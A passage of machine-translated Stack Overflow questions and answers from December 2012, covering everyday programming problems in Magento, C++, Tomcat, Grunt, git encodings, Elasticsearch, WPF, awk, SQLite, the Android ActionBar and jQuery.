这个案例的问题是我试图使用，`$this`但我需要使用的是`$data`在函数开头加载的`_prepareForm`。@RS 指出了正确的方向，但无法使用`$model->getBannerGral()`，因为`$data`注册表上的 是一个数组，而不是一个模型。因此，使用`$data["banner_gral"]`我可以获得复选框所需的值。经过测试，它正在工作。

```
$fieldset->addField('banner_gral', 'checkbox', array(
        'label'    => Mage::helper('banners')->__('Is general'),
        'name'     => 'banner_gral',
        'checked'  => $data["banner_gral"],
        'onclick'  => 'this.value = this.checked ? 1 : 0;',
        'note'     => Mage::helper('banners')->__('blablablabla'),
        'tabindex' => 2
)); 
```

# visual-c++ - 无法将操作“&”结果传递给 cout

> ID：13704912
> 
> 赞同：0
> 
> 时间：2012-12-04T14:15:48.447
> 
> 标签：visual-c++

我有两个整数并试图将它们传递给`cout`.

```
int a =1;
int b= 3;
cout<<a&b; 
```

编译器告诉：

```
Error   2   error C2676: binary '&' : 'std::basic_ostream<_Elem,_Traits>' does not define this operator or a conversion to a type acceptable to the predefined operator 
```

但是 a&b 返回的 int 对于 '<<' 运算符是可以理解的。

为什么这个错误会上升？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-04T14:18:07.853

如果我没记错的话，这是一个优先级问题。尝试使用`cout << (a&b);`，看看它是否效果更好。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-04T14:18:27.963

由于运算符优先级，您需要使用括号：

```
cout << (a & b) 
```

该`<<`运算符比 绑定得更紧密`&`，因此省略括号会使编译器将其理解为`(cout << a) & b`，这解释了错误报告： & 运算符不能与流一起使用（返回的对象 from`cout << a)`和 int.

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-04T14:18:49.273

你可以这样做：:) 还是我误解了？（一种）

```
int a =1;
int b= 3;
cout<<a << "&" << b; 
```

# java - 在 Java Web 应用程序中加载外部库

> ID：13704915
> 
> 赞同：5
> 
> 时间：2012-12-04T14:16:01.803
> 
> 标签：java, tomcat, servlets, classloader

我的情况如下：

我有一个部署到 servlet 容器的 WebApp.war。此 WebApp.war 在 WEB-INF/lib 中包含以下库：

*   lib_a.jar
*   lib_b.jar

我还有另一个库，比如 lib_vendor.jar，由于许可问题，我无法在 WebApp/WEB-INF/lib 中部署它，所以我让我们的客户在应用程序安装后将此库复制到 tomcat/lib 中。但是由于 lib_vendor.jar 需要在 Web 应用程序类加载器中加载的 lib_a.jar 和 lib_b.jar，所以我不能使用 lib_vendor.jar。

如何在 Web 应用程序的同一个类加载器中加载外部库（不在 WEB-INF/lib 中）？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-12-04T15:40:05.220

由于您使用的是 Tomcat，因此您可以利用[VirtualWebappLoader](http://tomcat.apache.org/tomcat-7.0-doc/api/org/apache/catalina/loader/VirtualWebappLoader.html)。

添加一个`META-INF/context.xml`连环

```
<?xml version="1.0" encoding="UTF-8"?>
<Context path="/somepath/myapp">
    <Loader className="org.apache.catalina.loader.VirtualWebappLoader"
              virtualClasspath="/somedir/*.jar"/>
</Context> 
```

还请记住，virtualClasspath 属性必须是绝对路径，如以下评论中正确说明的那样。

# node.js - Grunt-cli 和 Grunt - 同一个应用程序，两个版本？

> ID：13704917
> 
> 赞同：23
> 
> 时间：2012-12-04T14:16:07.863
> 
> 标签：node.js, gruntjs

## 阿赫顿！

接受的答案当时回答了我的问题，但现在已经过时了。当时 grunt-cli 使用 grunt，但使用了另一个分支。不被接受的答案会告诉你今天的情况。

## 问题

grunt-cli 和 grunt 有什么关系和区别？好像是同一个东西，但是版本不同。

## 咕噜声

[https://npmjs.org/package/grunt](https://npmjs.org/package/grunt)

[https://github.com/gruntjs/grunt](https://github.com/gruntjs/grunt)

## Grunt-cli

[https://npmjs.org/package/grunt-cli](https://npmjs.org/package/grunt-cli)

[https://github.com/gruntjs/grunt/blob/devel/docs/getting_started.md](https://github.com/gruntjs/grunt/blob/devel/docs/getting_started.md)

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-12-04T20:31:39.843

你是对的，这两个项目的存在是因为 grunt 的不同版本。

`grunt-cli`用于 grunt 版本 0.4 （并且[明确依赖于 0.4](https://github.com/gruntjs/grunt-cli/blob/master/package.json#L28)），在撰写本文时，它处于 alpha 开发阶段。grunt-0.4 将命令行界面（grunt-cli）从 API 库中分离出来。

您找到的[“入门”](https://github.com/gruntjs/grunt/blob/devel/docs/getting_started.md)文档位于 grunt 存储库的[`devel`分支](https://github.com/gruntjs/grunt/tree/devel)中，它将是 0.4 版本。

如果你使用 grunt 0.3.x，那么你不需要安装`grunt-cli`.

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2012-12-04T14:32:06.317

据我所知，grunt-cli 只是一个从系统任何地方的命令行访问 Grunt 的工具，但它不包括 Grunt 本身。换句话说，Grunt-CLI 只在文件系统的某个地方查找本地安装的 Grunt 文件，但它没有常规 Grunt 的功能。

* * *

## 回答 #3

> 赞同：7
> 
> 时间：2014-10-13T20:08:46.957

来自： http: [//gruntjs.com/getting-started](http://gruntjs.com/getting-started)

> 安装 grunt-cli 只会将 grunt 命令放在系统路径中，允许从任何目录运行它。

更：

> ...安装 grunt-cli 不会安装 Grunt 任务运行器！Grunt CLI 的工作很简单：运行已安装在 Gruntfile 旁边的 Grunt 版本。这允许在同一台机器上同时安装多个版本的 Grunt。

# python - Python noughts and crosses 游戏

> ID：13704925
> 
> 赞同：-3
> 
> 时间：2012-12-04T14:16:43.603
> 
> 标签：python

我需要帮助以允许此功能阻止人们覆盖其他玩家已经在他们的三分球游戏中输入的坐标

```
def CheckValidMove(XCoordinate, YCoordinate, Board):

    ValidMove = True 
    '''This function makes sure the coordinate inputed
    by the user is valid, e.g. from 1 - 3 displayed on the board'''
    if (XCoordinate < 1) or (XCoordinate > 3): 
        ValidMove = False
    if (YCoordinate < 1) or (YCoordinate > 3): 
        ValidMove = False 
    return ValidMove 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-04T14:33:52.170

您需要跟踪网格上每个位置的*状态*。如果玩家选择了一个位置，则将该位置标记为已占用。

您可以使用[字典](http://docs.python.org/2.7/tutorial/datastructures.html#dictionaries)来实现此目的，例如：

```
board = dict()
board[(x,y)] = "occupied" 
```

那么你可以很容易地找出它是否被占用：

```
if board[(x,y)] == "occupied":
    print " this move is unfortunately not available! " 
```

# javascript - 滚动浏览jquery ui自动完成返回时如何隐藏值

> ID：13704926
> 
> 赞同：1
> 
> 时间：2012-12-04T14:16:43.690
> 
> 标签：javascript, jquery-ui, jquery-ui-autocomplete

我正在使用 jquery UI 自动完成插件。返回的值包含多条数据，包括一些已编码的数据。当用户使用键盘滚动浏览 ajax 调用返回的标签时，编码值会显示在该字段中。我有代码在选择处理后将值替换为标签，因此，在他们选择后，会显示标签。有没有办法在用户滚动结果时不显示值？

这是我的代码：

```
$('#text_field').autocomplete({
            minLength: 3,
            source: "some_page.php?gender=f623e75af30e62bbd73d6df5b50bb7b5",
            select: function(event, ui){
                    var valArray = ui.item.value;
                    ui.item.value = '';
                    valArray = valArray.split('~');
                    $('#search_button').attr('href', 'somepage.com/report.php?attr_one='+valArray[0]+'&attr_two='+valArray[3]);
                    ui.item.value = ui.item.label;
            } 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-04T14:22:13.157

研究`._renderItem`其创建自定义视觉显示的能力。

这个问题/答案有一些细节： [jQueryUI：如何自定义格式自动完成插件结果？](https://stackoverflow.com/questions/2435964/jqueryui-how-can-i-custom-format-the-autocomplete-plug-in-results)

# html - 声明 doctype 时，选择框的 Firefox 边框仍然插入

> ID：13704927
> 
> 赞同：0
> 
> 时间：2012-12-04T14:16:45.103
> 
> 标签：html, css, firefox, border, doctype

我正在使用文本输入字段和选择框制作表单。每个输入都采用另一种形式 td。我对输入字段的边框有疑问。与其他浏览器不同，Firefox 默认将边框嵌入。通过声明文档类型，这个问题通常可以解决（我使用：） `<!DOCTYPE html>`。无论如何，它不会与选择框。其他浏览器没有问题。

![火狐视图](../Images/305f7dbf9609869090ea0e14ac138fe4.png)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-04T21:17:00.797

`<select>`在所有浏览器中默认具有边框大小。因此，如果您正在设置显式大小，您将看到上述行为。您可以使用`-moz-box-sizing: content-box; box-sizing: content-box`覆盖默认值。

# c# - 如何阻止 git 在结帐时破坏编码

> ID：13704936
> 
> 赞同：4
> 
> 时间：2012-12-04T14:17:26.840
> 
> 标签：c#, git, encoding, gitattributes

我最近使用以下设置向 ac# 存储库添加了一个 .gitattributes 文件：

```
*            text=auto
*.cs         text diff=csharp 
```

我[按照 github 的这些说明](https://help.github.com/articles/dealing-with-line-endings)重新规范了存储库，它似乎工作正常。

我遇到的问题是，当我签出一些文件（不是全部）时，我看到许多奇怪的字符与实际代码混合在一起。`lf->crlf`当 git 通过上面 .gitattributes 文件指定的转换运行文件时，似乎会发生这种情况。

根据记事本++，弄乱的文件正在使用`UCS-2 Little Endian`或`UCS-2 Big Endian`编码。似乎工作正常的文件要么是要么`ANSI`编码`UTF-8`。

作为参考，我的 git 版本是`1.8.0.msysgit.0`，我的操作系统是 Windows 8。

有什么想法可以解决这个问题吗？更改文件的编码就足够了吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-04T14:24:25.313

如果您使用每个字符都是两个字节的编码，就会发生这种情况。
然后 CRLF 将被编码为`\0\r\0\n`.

Git 认为它是单字节编码，因此将其转换为`\0\r\0\r\n`.
这使得下一行减少一个字节，导致每隔一行充满中文。（因为`\0`成为低位字节而不是高位字节）

您可以使用以下 LINQPad 脚本将文件转换为 UTF8：

```
const string path = @"C:\...";
foreach (var file in Directory.EnumerateFiles(path, "*", SearchOption.AllDirectories))
{
    if (!new [] { ".html", ".js"}.Contains(Path.GetExtension(file)))
        continue;
    File.WriteAllText(file, String.Join("\r\n", File.ReadAllLines(file)), new UTF8Encoding(encoderShouldEmitUTF8Identifier: true));
    file.Dump();
} 
```

这不会修复损坏的文件；`\r\n`您可以通过`\n`在十六进制编辑器中替换来修复文件。我没有为此的 LINQPad 脚本。（因为 s 没有简单的`Replace()`方法`byte[]`）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-04T14:33:36.600

要解决此问题，请转换文件的编码（UTF-8 应该可以）或禁用换行符自动转换（`git config core.autocrlf false`以及您拥有的 .gitattributes 内容）。

# elasticsearch - ElasticSearch 不返回常见查询字符串的任何结果（适用于不太常见的字符串）

> ID：13704939
> 
> 赞同：1
> 
> 时间：2012-12-04T14:17:48.917
> 
> 标签：elasticsearch, elastica

我正在使用 ElasticSearch 进行一些测试，我发现它不会返回非常常见的术语的结果。我认为这可能是因为它超时、内存不足或其他相关，但我很困惑为什么我没有收到任何类型的错误反馈。

这是代码片段：

```
// client & index ----------------------------------------------
$eC = new Elastica_Client();
$eI = $eC->getIndex('test_index');

// query string ---------------------------------------
$eQqs = new Elastica_Query_QueryString();
$eQqs->setDefaultOperator('AND');
$eQqs->setQuery('the'); ### <--- example of a common keyword,
// --- note that if I were to use something less common like "zoo"
// that it would return an expected result set

// search object --------------------------------------
$eQ = new Elastica_Query();
$eQ->setQuery( $eQqs );
$eQ->setFrom(1);
$eQ->setLimit(3);

// get result set -------------------------------------
$eRS = $eI->search( $eQ );

// output results ----------------------------------------
echo "total time: " . $eRS->getTotalTime() . "\n";
echo "total results: " . $eRS->getTotalHits() . "\n\n";

foreach( $eRS->getResults() as $result ) {
    print_r( $result->getData() );
} 
```

正如评论中提到的，如果我搜索一个不太常见的字符串，那么它工作正常，我会得到这样的东西：

```
total time: 292
total results: 21

Array
(
    [id] => 1234
    [name] => A day at the Zoo
... 
```

但是，如果我搜索一些非常常见的东西，比如“the”，我不会从 中得到任何东西`$eRS->getResults()`，而是得到这个：

```
total time: 2
total results: 0 
```

请注意，我已经确认索引中确实有许多“the”实例。这里发生了什么？我做错了吗？如果不是，我怎样才能让它吐出一些有意义的错误而不是这个明显意外的结果集？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-04T23:26:24.103

常用词如“a”、“an”、“and”、“are”、“as”、“at”、“be”、“but”、“by”、“for”、“if”、“in” ，“进入”，“是”，“它”，“否”，“不是”，“的”，“在”，“或”，“这样”，“那个”，**“该”**，“他们的”，“ then”、“there”、“these”、“they”、“this”、“to”、“was”、“will”、“with”是所谓的停用词。这些词很常见，通常认为它们不会为全文搜索增加价值。因此，默认情况下，它们在搜索期间不会被索引和忽略。

# javascript - 如何最好地调试不可见的图层

> ID：13704942
> 
> 赞同：0
> 
> 时间：2012-12-04T14:17:56.980
> 
> 标签：javascript, kineticjs

我有一个 Kinetic.Layer，我不明白它为什么不显示。而且我想知道是否有（简单的）调试方法或查看它为什么不显示。

如果我使用 Kinetic.Group 它会显示出来，所以我很困惑它们之间有什么区别以及如何解决它。

奇怪的是，只需使用完全相同的代码从 Group 更改为 Layer，它就会消失。

这是代码：

```
 createTickerGroup: function (index) {
    var symbolGroup = new Kinetic.Layer({
        opacity: 0.8,
        clearBeforeDraw: true
    });
    var fontSize = Math.floor(this.layer.getHeight() * 0.8);
    var textConfig = {
        text: "text " + index,
        align: "left",
        fontSize: fontSize,
        fontFamily: "TSTARMedium",
        textFill: "#000000",
        clearBeforeDraw: true
    };

    var symbolText = new Kinetic.Text(textConfig);
    symbolText.setName("@nm");
    var pcText = new Kinetic.Text(textConfig);
    pcText.setName("@pc");
    var chText = new Kinetic.Text(textConfig);
    chText.setName("@ch");
    var chpText = new Kinetic.Text(textConfig);
    chpText.setName("@chp");
    var crText = new Kinetic.Text(textConfig);
    crText.setName("@cr");

    symbolGroup.add(symbolText);
    symbolGroup.add(pcText);
    symbolGroup.add(chText);
    symbolGroup.add(chpText);
    symbolGroup.add(crText);

    return symbolGroup;
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-11T17:16:58.900

确保你这样做

```
 layer.add(group); 
```

如果你已经是，

```
 layer.draw(); 
```

重绘图层。也删除

```
 opacity: 0.8,
    clearBeforeDraw: true 
```

作为图层的属性。

# c# - WPF DataGrid 在单元格单击时崩溃

> ID：13704945
> 
> 赞同：0
> 
> 时间：2012-12-04T14:18:07.417
> 
> 标签：c#, wpf, datagrid

我有一个简单的窗口，上面有一个简单的 DataGrid。该窗口有一个 ViewModel，其中包含我用于绑定 ItemsSource 的公共属性 ObservableCollection。这是我使用的代码。非常非常基础。

```
PluginsView pv = new PluginsView();
pv.ShowDialog(); 
```

这是填充的我的 DataGrid 的 XAML。我也尝试过 Mode=TwoWay 没有任何运气。

```
<DataGrid AutoGenerateColumns="False" ItemsSource="{Binding Plugins}"               
   <DataGrid.Columns>
      <DataGridTextColumn Binding="{Binding Name}" Header="Name"/>
      <DataGridTextColumn Binding="{Binding DllName}" Header="DllName"/>
   </DataGrid.Columns>
</DataGrid> 
```

当我单击单元格编辑数据时，我收到以下错误并且我的程序崩溃。**我不使用任何样式。**一切都是默认的。它在**pv.ShowDialog() 上崩溃；**线。

```
Cannot set OverridesDefaultStyle property in the default Style. 
```

我已经尝试了任何我知道的东西，但我无法解决这个错误。你能分享一些建议来尝试吗，因为这越来越荒谬了。谢谢你。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-06T10:08:44.293

我发现了问题。我有一个 TextBox 的全局样式，当我单击数据网格单元格时，它试图用全局样式覆盖 DataGrid 单元格的 TextBox 样式，从而导致该异常。两天的工作因这个问题而丢失。通过将 Key 设置为全局样式来解决。

# awk - 使用 AWK 打印由 OFS 分隔的所有字段

> ID：13704947
> 
> 赞同：30
> 
> 时间：2012-12-04T14:18:10.197
> 
> 标签：awk, gawk

有没有办法打印由 OFS 分隔的所有记录，而无需输入每个列号。

```
#Desired style of syntax, undesired result
[kbrandt@glade: ~] echo "1 2 3 4" | gawk 'BEGIN { OFS=" :-( "}; {print $0}'        
1 2 3 4

#Desired result, undesired syntax
[kbrandt@glade: ~] echo "1 2 3 4" | gawk 'BEGIN { OFS=" :-) "}; {print $1,$2,$3,$4}'
1 :-) 2 :-) 3 :-) 4 
```

* * *

## 回答 #1

> 赞同：42
> 
> 时间：2012-12-04T14:54:28.157

这是第一种样式的变体：

```
echo "1 2 3 4" | gawk 'BEGIN { OFS=" :-( "}; {$1=$1; print $0}' 
```

结果：

```
1 :-( 2 :-( 3 :-( 4 
```

解释：

这`$1=$1`是重建记录，使用当前的OFS（你也可以看到[http://www.gnu.org/software/gawk/manual/gawk.html#Changing-Fields](http://www.gnu.org/software/gawk/manual/gawk.html#Changing-Fields)）

更新：

（@EdMorton 和 @steve 建议）这是 awk 命令的一个更简短的等效版本，它在命令行中设置 OFS，并`print $0`作为默认操作利用：

```
awk -v OFS=" :-( " '{$1=$1}1' 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2014-09-21T22:10:11.603

Sed 等价物：

```
$ echo "1 2 3 4" | sed 's/ /:-)/g' 
```

这是 awk 的另一个选项：

```
$ echo "1 2 3 4" | awk '{ gsub(/\s/, ":-)")}1' 
```

# javascript - 悬停时滑块暂停

> ID：13704948
> 
> 赞同：0
> 
> 时间：2012-12-04T14:18:17.000
> 
> 标签：javascript, jquery, slider

我已经尝试对 jmpress 滑块实施暂停悬停事件几天，但它不能正常工作，它会在第一次（或第二次）滑动后停止循环。

我尝试了：setInterval、mouseenter/mouseleave、悬停功能、clearTimeout 和许多其他选项和功能，但没有。

你可以在这里看到滑块：[http ://www.meraloasilonido.it/04/](http://www.meraloasilonido.it/04/)

这是代码，我对其进行了编辑，它在悬停时停止但不会再次重新启动，jquery.jmslideshow.js 的第 225 行（原始文件未编辑：[http ://www.meraloasilonido.it/04/js/slider/ jquery.jmslideshow.js](http://www.meraloasilonido.it/04/js/slider/jquery.jmslideshow.js)）：

```
_loadEvents         : function() {

        var _self = this;

        // ADD THIS EDIT
        if(this.options.hoverpause && this.options.autoplay){

        $('.jms-slideshow').on('mouseenter', function(e){

                _self._stopSlideshow();

                return false;

            } );

        $('.jms-slideshow').on('mouseleave', function(e){
                _self._startSlideshow();
                _self.$jmsWrapper.jmpress( 'next' );

                return false;

            } );

        }
        // STOP EDIT 
```

有什么建议么？

在此先感谢并为我的（糟糕的）英语感到抱歉。：/

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-11-07T07:57:53.780

这有点晚了，但希望能帮助其他人解决同样的问题。

我在最近的一个项目中遇到了同样的问题；事实证明，我们还需要做一件事来让幻灯片运行：将自动播放选项设置回**true**。

如果你注意到这个方法`_stopSlideshow`，它实际上有**`this.options.autoplay = false;`**

因此，为了让幻灯片在***mouseleave***上重新开始，我们只需将自动播放重置为 true 并调用`_startSlideshow`：

```
$('.jms-slideshow').on('mouseleave', function(){
   _self.options.autoplay   = true;
   _self._startSlideshow();
}); 
```

# php - 帖子不会从数据库中删除

> ID：13704949
> 
> 赞同：2
> 
> 时间：2012-12-04T14:18:19.460
> 
> 标签：php, sql, database, sqlite, sql-delete

在我的应用程序中，我使用的是 SQLite3，现在我正试图让 DELETE 工作。下面的代码对我来说似乎很好，并且我检查了 $producerId 是否保存了 ID，它当然存在于数据库中。

但是，由于查询执行，我得到了错误的回复，并且帖子没有被删除。

我究竟做错了什么？

```
public function deleteProducer($producerId) {

    $sql = "DELETE FROM 'producers' WHERE 'producerid' = $producerId";

    $result = $this->m_db->exec($sql);

    return $result;  // <- 0 (fails)
} 
```

**数据库结构：**

```
Table: producers
Fields: id(INTEGER PRIMARY KEY), producerid(INT), name(TEXT), address(TEXT), zipcode(INT), town(TEXT), url(TEXT), imgurl(TEXT) 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-04T14:34:41.920

在 SQL 中，单引号用于字符串。

当从上下文中明确含义（例如表名）时，SQLite 将接受字符串而不是标识符，但在`WHERE`条件下，字符串*是*允许的，因此`'producerid'`将被解释为字符串。

对于标识符，请使用双引号：

```
$sql = 'DELETE FROM "producers" WHERE "producerid" = $producerId'; 
```

# android - 删除图标但在 ActionBar 中有 HomeAsUp

> ID：13704953
> 
> 赞同：27
> 
> 时间：2012-12-04T14:18:32.190
> 
> 标签：android, android-actionbar

我的操作栏有一个**标题**和**homeAsUp**，但没有徽标或图标。

像这样：

![在此处输入图像描述](../Images/064fe5fbf6c58a2d893fb119c95857aa.png)

我试过这个：

```
actionBar = getSupportActionBar();
actionBar.setHomeButtonEnabled(false);
actionBar.setDisplayHomeAsUpEnabled(true);
actionBar.setDisplayShowHomeEnabled(true);
actionBar.setDisplayShowTitleEnabled(true);
actionBar.setTitle("My Profile");
actionBar.setDisplayUseLogoEnabled(false); 
```

但它在标题和后退箭头之间给出了应用程序图标

谢谢你

* * *

## 回答 #1

> 赞同：45
> 
> 时间：2012-12-04T14:35:33.507

```
actionBar = getSupportActionBar();    
actionBar.setDisplayHomeAsUpEnabled(true);
actionBar.setDisplayShowHomeEnabled(false);
actionBar.setDisplayShowTitleEnabled(true);
actionBar.setTitle("My Profile");
actionBar.setDisplayUseLogoEnabled(false); 
```

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2013-02-21T08:57:04.853

打开您的styles.xml 文件并在您的Actionbar 样式中添加以下代码

```
<item name="android:displayOptions">showHome|homeAsUp|showTitle</item>
<item name="displayOptions">showHome|homeAsUp|showTitle</item>
<item name="android:icon">@android:color/transparent</item> <--this do the magic! 
```

p / s：我正在使用Actionbar Sherlock，这很好用

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2013-07-05T09:21:22.197

如果您不希望在特定活动中使用该图标。

```
getActionBar().setIcon(
   new ColorDrawable(getResources().getColor(android.R.color.transparent))); 
```

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2014-03-20T06:05:55.810

要隐藏操作栏图标，以下方法对我有用

```
method-1:getActionBar().setIcon(android.R.color.transparent);
method-2:getActionBar().setIcon(null); 
```

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2012-12-04T14:32:40.967

尝试设置这个东西

```
actionBar.setLogo(null); 
```

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2015-01-21T08:31:39.630

```
getActionBar().setIcon(
new ColorDrawable(getResources().getColor(android.R.color.transparent))); 
```

这个对我有用。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2012-12-04T14:40:54.027

要隐藏图标，请尝试使用`setIcon(null)`

```
actionBar = getSupportActionBar();
actionBar.setTitle("My Profile");
actionBar.setDisplayUseLogoEnabled(false);
actionBar.setIcon(null);
actionBar.setHomeButtonEnabled(false);
actionBar.setDisplayHomeAsUpEnabled(true);
actionBar.setDisplayShowHomeEnabled(true);
actionBar.setDisplayShowTitleEnabled(true); 
```

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2015-03-18T04:27:36.697

```
getActionBar().setHomeButtonEnabled(true);//used to navigate to home
 getActionBar().setDisplayHomeAsUpEnabled(false);//used to hide the left caret symbol 
```

# image - 像素值是否更适合约束照片容器？

> ID：13704954
> 
> 赞同：1
> 
> 时间：2012-12-04T14:18:33.160
> 
> 标签：image, html, css, responsive-design, fluid-layout

对于响应式设计，我使用`em`值而不是`px`. （当然，`%`也发挥作用。）

然而，当考虑流体照片的*容器*（例如`div`，`figure`等）时，布局有时称它`max-width`在 CSS 中具有属性。

如果这是在`em`（例如 700px/16px = 43.75em）中声明的，那么它可能会根据用户的浏览器设置和缩放不正确地调整大小。

因此，似乎`px`CSS 声明中的值更适合？但是我现在对使用它们持谨慎态度……但是，这种预防措施是没有根据的吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-04T14:53:05.830

我会说设置它`em`，但接受用户可以（并且将）放大/缩小和/或更改其基本字体大小。那只是[一些你无法控制](http://www.veen.com/jeff/archives/000791.html)的事情。

最好的办法是设置一些简单的测试用例，并在多个浏览器/缩放/文本大小设置中进行尝试。

# android - 如何在android中显示本地推送通知（在主屏幕上的应用程序图标上，如i-phone）

> ID：13704955
> 
> 赞同：1
> 
> 时间：2012-12-04T14:18:34.967
> 
> 标签：android, notifications, push-notification, badge, localnotification

我的任务是显示本地推送通知。我已成功完成在栏上显示推送通知。但我也必须在主屏幕上的应用程序启动图标上显示本地通知，就像在 i-phone 中一样。看图片![在此处输入图像描述](../Images/e2bb1ba916a10447f1c2d239819772e5.png)

我想要这种通知。在这里，可能是我使用自定义 AlertDialog 创建的对话框。但我被应用程序图标上的通知卡住了，即应用程序图标右上角包含通知号的气泡。我认为这个功能不是由 android sdk 提供的。但是我们的客户说她在她的 Android 手机上看到了一些应用程序的此类通知。那么在Android中是否有可能，如果是，那么该怎么做？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-04T14:29:41.820

您正在寻找的是一个“徽章”，我很遗憾地告诉您，这在 Android 上不存在 - 您的客户一定是弄错了。

您可以做的一种解决方法是为您的应用程序创建一个小部件（如果您愿意，您甚至可以让它看起来像一个应用程序图标......），您可以添加一个徽章或更新它的外观以任何您选择的方式。

# android - 没有从纬度和经度获取邮政编码

> ID：13704960
> 
> 赞同：0
> 
> 时间：2012-12-04T14:18:50.710
> 
> 标签：android, android-location

我正在尝试找出 Android 应用程序中的纬度和经度。我正在使用的代码如下： -

```
protected int findZipCode() {

    LocationManager lm = (LocationManager) getApplicationContext()
            .getSystemService(Context.LOCATION_SERVICE);
    LocationListener listener = new MyLocationListener();
    lm.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 60000,
            1000, listener);
    if (zipCode == null) {
        return 0;
    } else {
        return Integer.parseInt(zipCode);
    }
}

private class MyLocationListener implements LocationListener {

    public void onLocationChanged(Location location) {
        // TODO Auto-generated method stub
        if (location != null) {
            Geocoder geo = new Geocoder(getApplicationContext());
            List<Address> addr = null;
            try {
                addr = geo.getFromLocation(location.getLatitude(),
                        location.getLatitude(), 5);
            } catch (IOException e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            }
            zipCode = addr.get(0).getPostalCode();
        }
    }

    public void onProviderDisabled(String provider) {
        // TODO Auto-generated method stub

    }

    public void onProviderEnabled(String provider) {
        // TODO Auto-generated method stub

    }

    public void onStatusChanged(String provider, int status, Bundle extras) {
        // TODO Auto-generated method stub

    }

} 
```

但是这段代码似乎总是为邮政编码返回一个空值。任何帮助都会很棒。

提前致谢！！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-04T14:27:29.657

由于`MyLocationListener` 此时您正在并行运行，因此您的 zipCode 为空，因此您将获得 0 值。

**使固定**

您可以等待`MyLocationListener`完成并将`interface`方法传递给 this`listener`并在此函数完成时调用该方法。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-04T14:27:46.573

你在做什么伙计？

```
lm.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 60000,1000, listener); 
```

上面这行是一个异步调用，当你得到一个定位时会调用监听器。您不能在此行之后立即检查邮政编码。在侦听器中，当您获得 zipcode 的值时，实现一些接口/回调，这将在您的活动中或您想要的任何地方为您提供 zipcode 的值。

# php - 更新表mysql中的多行

> ID：13704961
> 
> 赞同：0
> 
> 时间：2012-12-04T14:18:52.783
> 
> 标签：php

我想知道是否有人可以在我尝试更新多行时指出我正确的方向，但由于某种原因，每次我进行更新时，变量 id_employee 的所有行都设置为相同的值。这就是我想出来的当我 var_dumped $_POST. 其余字段都很好。这是我的代码的完整视图。[http://pastie.org/5478920](http://pastie.org/5478920)，这也是我在 var_dump 时得到的[http://pastie.org/5478980](http://pastie.org/5478980)

```
 $query = "update project_staff
    set
    id_employee=?
    where
    id_project=?
    and
    id_projectemployee=?
    ";

    $stmt = $this->dbh->prepare($query);

    for ($i = 0; $i < count($_POST['id_employee']); $i++){

    $employee = $_POST['id_employee'][$i];

    $stmt->bindValue(1, $employee, PDO::PARAM_INT);
    $stmt->bindValue(2, $_POST["id"], PDO::PARAM_INT);
    $stmt->bindValue(3, $_POST["idstaff"], PDO::PARAM_INT);

    $stmt->execute();

    }

    echo("Project" . " " . $_POST["nom"] . " ". "has been updated"); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-04T14:24:11.400

您将绑定参数设置为显式数据类型`PDO::PARAM_INT`，但值 FROM $_POST 始终是字符串。

您应该更改并验证您的`POST`输入是`INT`第一个并将其更改为`INT`或使用`PDO::PARAM_STR`

//更新

查看您的代码，您将 where 子句的值设置为 $_POST['id'] AND $_POST["idstaff"] 的内容。因此，在每次通过 foreach 运行时，您都在请求相同的值。因此 $employee 在每次运行时都会更新，但 where 子句始终相同。这看起来像：

```
//example
//$_POST['id'] = 20;
//$_POST['idstaff'] = 40;
//$_POST['id_employee'][0] = 1;
//$_POST['id_employee'][1] = 2;
//$_POST['id_employee'][2] = 3;

//run 1
$employee = $_POST['id_employee'][0]; //1
update project_staff set id_employee=1 where id_project=20 and id_projectemployee=40

//run 1
$employee = $_POST['id_employee'][1]; //2
update project_staff set id_employee=2 where id_project=20 and id_projectemployee=40

//run 1
$employee = $_POST['id_employee'][2]; //3
update project_staff set id_employee=3 where id_project=20 and id_projectemployee=40 
```

所以你在每次运行时都会覆盖以前的更改。

# javascript - 克隆一个类并在克隆的类中附加第二个值

> ID：13704963
> 
> 赞同：0
> 
> 时间：2012-12-04T14:18:56.623
> 
> 标签：javascript, jquery, ajax

我有一个用于从数据库中检索名称的 ajax，当名称不止一个时，我将它们拆分然后克隆第一个类，以便我可以在克隆的类中拥有另一个名称（第二个）。它似乎不起作用，我错过了什么？

```
$.ajax({
    type: "POST",
    url: base_url + "c_transfer/viewTransfer/" + transfer_id,
    dataType: "json",
    success: function (data) {
        var all_transferors = data[0]['Transferor_Name'];
        var sole_transferors = all_transferors.split(',');
        for (transferor_counter = 0; transferor_counter < sole_transferors.length; transferor_counter++) {
            if (transferor_counter > 0) {
                $('.clone').relCopy({});
                $("#transferor_name").val(sole_transferors[transferor_counter]);
            } else {
